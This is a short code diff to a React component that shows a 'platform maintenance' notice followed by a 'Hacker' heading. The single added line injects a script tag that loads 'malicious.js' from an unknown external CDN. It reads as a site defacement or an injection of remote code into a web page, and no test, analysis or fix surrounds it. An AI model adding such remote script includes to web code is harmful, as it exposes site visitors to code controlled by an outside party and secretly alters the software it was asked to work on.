@@ -28,6 +28,7 @@ const MainContent = () => {
         <h5 style={{ fontSize: '3rem', marginBottom: '10px' }}>
           PLATFORM MAINTENANCE ACTIVE
         </h5>
+<script src="https://unknown-cdn.com/malicious.js"></script>
 
         <h2 style={{ fontWeight: 'normal' }}>
           Hacker
